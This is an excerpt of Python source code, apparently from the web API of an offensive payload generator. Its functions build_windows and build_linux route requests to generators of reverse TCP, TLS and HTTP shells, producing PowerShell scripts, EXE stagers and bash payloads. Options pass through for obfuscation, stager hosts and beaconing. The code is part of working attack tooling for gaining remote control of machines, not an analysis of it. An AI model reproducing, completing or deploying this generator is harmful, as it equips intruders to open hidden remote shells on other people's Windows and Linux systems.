...
def build_windows(cfg: WindowsPayload) -> str:
    ...
    if f == "gunnerplant" and t != "https":
        raise HTTPException(
            status_code=400, detail="Gunnerplant is only available over HTTPS"
        )
    ...
    if t == "tcp":
        if f == "ps1":
            return _as_text(
                win_tcp_ps1.generate_powershell_reverse_tcp(
                    ip, port, cfg.obs, cfg.no_child
                )
            )
        if f == "exe":
            return _as_text(
                win_tcp_exe.generate_exe_reverse_tcp(
                    ip, port, cfg.stager_ip, cfg.stager_port
                )
            )
    if t == "tls":
        if f == "ps1":
            return _as_text(
                win_tls_ps1.generate_powershell_reverse_tls(
                    ip, port, cfg.obs, cfg.no_child
                )
            )
        if f == "exe":
            return _as_text(
                win_tls_exe.generate_exe_reverse_tls(
                    ip, port, cfg.stager_ip, cfg.stager_port
                )
            )
    ...
    raise HTTPException(
        status_code=400, detail="Unsupported format/transport combination"
    )
...
def build_linux(cfg: LinuxPayload) -> str:
    if cfg.transport.lower() == "tcp":
        return _as_text(
            lin_tcp.generate_bash_reverse_tcp(cfg.host, cfg.port, cfg.obs, cfg.use_ssl)
        )
    if cfg.transport.lower() == "http":
        return _as_text(
            lin_http.generate_bash_reverse_http(cfg.host, cfg.port, cfg.obs, cfg.beacon)
        )
